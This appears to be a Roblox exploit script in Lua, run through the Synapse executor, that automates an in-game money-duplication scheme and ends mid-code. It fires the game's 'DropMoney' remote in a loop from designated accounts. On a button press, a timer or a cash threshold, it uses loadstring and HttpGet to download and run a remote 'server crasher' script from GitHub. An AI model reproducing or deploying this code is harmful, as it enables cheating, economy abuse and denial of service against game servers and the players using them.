--[[ 
- Features
 Automatic dupe system with save system
 req: synapse
]]

-- Note : all scripted by me [ Lerk#7643 / owner of this github ] #besides the NL function, stole that from IY
-- Note 2 :  THIS IS A WORK IN PROGRESS, WHAT IS SHOWN IS NOT COMPLETE WORK

if not game:IsLoaded() then game.Loaded:Wait() end
if getgenv().Enabled == true then
    local Player = game.Players.LocalPlayer
    if not Player.Character then Player.CharacterAdded:Wait() end
    local Dropping = false
    
    function announce(title,text,time)
        game.StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = time;
        })
    end

    if syn then
        if isfolder("DupeData") then  
            -- \\ Ignore
        else
            makefolder("DupeData") 
        end
    end
    
        local DUPERS = {}
        local DATA = {
            Dupers = '',
            CrashAt = 50000,
            Crasher = 'nil',
            CrashAfter = 9999999999,
            GFX = 'LowGFX',
            FPS = 15,
        }
        if syn then
            if not isfile('DupeData/DuperList.txt') then 
                writefile("DupeData/DuperList.txt", "nil/nil") 
            end
            DATA.Dupers = tostring(readfile("DupeData/DuperList.txt"))
            if not isfile('DupeData/CrashAtCash.txt') then 
                writefile("DupeData/CrashAtCash.txt", "50000") 
            end
            DATA.CrashAt = tonumber(readfile("DupeData/CrashAtCash.txt"))
            if not isfile('DupeData/Crasher.txt') then 
                writefile("DupeData/Crasher.txt", "nil")
            end
            DATA.Crasher = tostring(readfile("DupeData/Crasher.txt"))
            if not isfile('DupeData/CrashAfter.txt') then 
                writefile("DupeData/CrashAfter.txt", "999999999999") 
            end
            DATA.CrashAfter = tonumber(readfile("DupeData/CrashAfter.txt"))
            if not isfile('DupeData/GFX.txt') then 
                writefile("DupeData/GFX.txt", "LowGFX") 
            end
            DATA.GFX = tostring(readfile("DupeData/GFX.txt"))
            if not isfile('DupeData/FPS.txt') then 
                writefile("DupeData/FPS.txt", "FPS") 
            end
            DATA.FPS = tonumber(readfile("DupeData/FPS.txt"))
        end
        
        local DupersTable = DATA.Dupers:split('/')
        for i,v in pairs(DupersTable) do
            table.insert(DUPERS, v)
        end
        
        print('DATA LOADED --------')
        print(tostring(DATA.CrashAt))
        print(tostring(DATA.Crasher))
        print(tostring(DATA.CrashAfter))
        print(tostring(DATA.GFX))
        print(tostring(DATA.FPS))
        print('DUPERS  -----------')
        for i,v in pairs(DUPERS) do
            print(v)
        end
        print('----------------------')
    
    if table.find(DUPERS, Player.Name) then
        Dropping = true
    elseif table.find(DUPERS, Player.UserId) then
        Dropping = true
    end
    
    if Dropping then
        UserSettings():GetService("UserGameSettings").MasterVolume = 0/10
        
        local CrashButton = Instance.new("ScreenGui")
        local TextButton = Instance.new("TextButton")
    
        CrashButton.Name = "CrashButton"
        CrashButton.Parent = game.CoreGui
        CrashButton.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        TextButton.Parent = CrashButton
        TextButton.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
        TextButton.Position = UDim2.new(0.377055228, 0, 0.232277542, 0)
        TextButton.Size = UDim2.new(0, 308, 0, 50)
        TextButton.Font = Enum.Font.SourceSans
        TextButton.Text = "CRASH SERVER"
        TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
        TextButton.TextScaled = true
        TextButton.TextSize = 14.000
        TextButton.TextWrapped = true
        TextButton.MouseButton1Click:Connect(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
        end)
    
        Player.Character.HumanoidRootPart.CFrame = CFrame.new(getgenv().DropLocation)

        local Crashing = false
        if Player.Name == DATA.Crasher or Player.UserId == DATA.Crasher then
            Crashing = true
        end
        
        coroutine.resume(coroutine.create(function()
            while wait(10) do
                pcall(function()
                    for i,v in pairs(game:GetService("Workspace").Ignored.Drop:GetChildren()) do
                        if v.Name == 'MoneyDrop' then
                            v:Destroy()
                        end
                    end
                end)
            end     
        end))
        coroutine.resume(coroutine.create(function()
            while wait(2.5) do
                pcall(function()
                    if (getgenv().DropLocation - Player.Character.HumanoidRootPart.Position).Magnitude > 20 then
                        Player.Character.HumanoidRootPart.CFrame = CFrame.new(getgenv().DropLocation)
                    end
                    if Crashing == true then
                        if Player.DataFolder.Currency.Value <= DATA.CrashAt then
                            TextButton:Destroy()
                            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                            wait(math.huge)
                        end
                    end
                    local DropAm = 10000
                    if Player.DataFolder.Currency.Value > 10000 then
                        DropAm = '10000'
                    else
                        DropAm = tostring(Player.DataFolder.Currency.Value)
                    end
                    local args = {
                        'DropMoney',
                        DropAm
                    }
                    game.ReplicatedStorage:WaitForChild('MainEvent'):FireServer(unpack(args))
                end)
            end     
        end))
        coroutine.resume(coroutine.create(function()
            wait(DATA.CrashAfter)
            TextButton:Destroy()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
        end))

        local function NL()
            workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
        	workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
        	workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
        	workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
        	game:GetService("Lighting").GlobalShadows = false
        	game:GetService("Lighting").FogEnd = 9e9
        	settings().Rendering.QualityLevel = 1
        	for i,v in pairs(game:GetDescendants()) do
        		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        			v.Material = "Plastic"
        			v.Reflectance = 0
        		elseif v:IsA("Decal") then
        			v.Transparency = 1
        		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        			v.Lifetime = NumberRange.new(0)
        		elseif v:IsA("Explosion") then
        			v.BlastPressure = 1
        			v.BlastRadius = 1
        		end
        	end
        	for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
        		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
        			v.Enabled = false
        		end
        	end
        end
        
        wait(1)
        announce('Loading GFX Settings...')
        wait(2)
        if DATA.GFX == 'LowGFX' then
            NL()
        elseif DATA.GFX == 'ReallyLowGFX' then
            NL()
            if not Crashing then
                game:GetService("RunService"):Set3dRenderingEnabled(false)
                for i,v in pairs(game.Workspace:GetDescendants()) do
                    pcall(function()
                        if v:IsA('Part') or v:IsA('UnionOperation') or v:IsA('WedgePart') or v:IsA('MeshPart') then
                            if v.Parent.Parent.Name ~= 'Shop' then
                                if (getgenv().DropLocation - v.Position).Magnitude > 100 then
                                    v:Destroy()
                                end
                            end
                        end
                    end)
                end
            end
        end
        setfpscap(DATA.FPS)
    end
    
    if not Dropping then
        local SimplySwag = Instance.new("ScreenGui")
